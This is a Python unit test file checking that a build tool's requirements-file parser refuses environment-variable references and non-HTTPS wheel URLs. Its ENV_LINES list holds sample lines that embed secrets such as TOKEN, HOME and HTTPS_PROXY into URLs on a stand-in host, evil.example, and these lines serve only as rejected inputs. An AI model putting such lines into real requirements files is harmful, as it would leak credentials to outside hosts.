"""V0.7 G6 fix round 2 (D163): what a job's requirements file may not say.

* T-15: ``${VAR}`` / ``$VAR`` is refused always - wheels-only or not, on the
  uv path and on the Docker pip path (both read the file through
  ``EnvBuilder.read_requirements``) - typed, naming the line.
* wheel URLs are ``https://`` only under wheels-only (code follows OPERATIONS).
"""

from __future__ import annotations

from pathlib import Path

import pytest

from meshforge.agent.envs.builder import EnvBuilder, EnvsConfig
from meshforge.agent.envs.errors import EnvError
from meshforge.agent.envs.hash import normalize_requirements
from meshforge.common.errors import FailureType

pytestmark = pytest.mark.unit

ENV_LINES = [
    "pkg @ https://${HTTPS_PROXY}.evil.example/pkg-1-py3-none-any.whl",
    "pkg @ https://evil.example/${HOME}/pkg-1-py3-none-any.whl",
    "pkg @ https://evil.example/$HOME/pkg-1-py3-none-any.whl",
    "pkg==${V}",
    "pkg==$V",
    "pkg==1.0 ; python_version >= '$_X'",
    "${NAME}==1.0",
    "--index-url https://${TOKEN}@index.example/simple",
    "--extra-index-url https://index.example/$USER/simple",
    "pkg==1.0 --hash=sha256:${H}",
]


@pytest.mark.parametrize("wheels_only", [True, False], ids=["wheels-only", "builds-ok"])
@pytest.mark.parametrize("line", ENV_LINES)
def test_an_environment_reference_is_refused_always(
    line: str, wheels_only: bool
) -> None:
    text = f"six==1.16.0\n{line}\n".encode()
    with pytest.raises(EnvError) as caught:
        normalize_requirements(text, wheels_only=wheels_only)
    error = caught.value
    assert error.failure_type is FailureType.ENV_ERROR
    assert error.reason == "requirements_rejected"
    assert "requirements line 2" in error.message
    assert "environment variable" in error.message


@pytest.mark.parametrize("only_binary", [True, False])
def test_the_builder_read_refuses_it_for_every_runtime(
    tmp_path: Path, only_binary: bool
) -> None:
    # read_requirements is the one door: the uv builds (venv, subprocess) and
    # the Docker pip build install only what it returns.
    builder = EnvBuilder(
        EnvsConfig(root=tmp_path / "envs", only_binary=only_binary), uv_argv=("uv",)
    )
    work = tmp_path / "work"
    work.mkdir()
    (work / "requirements.txt").write_text("six==1.16.0\npkg==${HOME}\n")
    with pytest.raises(EnvError, match="requirements line 2") as caught:
        builder.read_requirements(work, "requirements.txt")
    assert caught.value.reason == "requirements_rejected"


@pytest.mark.parametrize(
    "line",
    [
        "six==1.16.0  # costs $5, see ${HOME}",  # a comment is not installed
        "pkg==1.0 ; python_version >= '3.9'",
        "pkg @ https://files.example/a%24b/pkg-1-py3-none-any.whl",
        "pkg==1.0 --hash=sha256:" + "0" * 64,
    ],
)
def test_lines_without_a_reference_are_still_accepted(line: str) -> None:
    assert normalize_requirements(f"{line}\n".encode(), wheels_only=True)


def test_a_dollar_that_names_nothing_is_not_a_reference() -> None:
    # "$" followed by neither "{" nor a name character expands to nothing.
    assert normalize_requirements(b"pkg @ https://h.example/a$/p-1-py3-none-any.whl\n")


@pytest.mark.parametrize(
    "line",
    [
        "pkg @ http://files.example/pkg-1-py3-none-any.whl",
        "pkg @ HTTP://files.example/pkg-1-py3-none-any.whl",
        "pkg @ HTTPS://files.example/pkg-1-py3-none-any.whl",  # uv: a local path
        "http://files.example/pkg-1-py3-none-any.whl",
        "pkg @ ftp://files.example/pkg-1-py3-none-any.whl",
    ],
)
def test_a_wheel_url_that_is_not_https_is_refused_under_wheels_only(line: str) -> None:
    with pytest.raises(EnvError, match="requirements line 1") as caught:
        normalize_requirements(f"{line}\n".encode(), wheels_only=True)
    assert caught.value.reason == "requirements_rejected"
    assert "https:// URL of a wheel" in caught.value.message


@pytest.mark.parametrize(
    "line",
    [
        "pkg @ https://files.example/pkg-1-py3-none-any.whl",
        "pkg @ https://files.example/pkg-1-py3-none-any.WHL",
        "https://files.example/pkg-1-py3-none-any.whl",
    ],
)
def test_an_https_wheel_url_is_accepted_under_wheels_only(line: str) -> None:
    assert normalize_requirements(f"{line}\n".encode(), wheels_only=True)
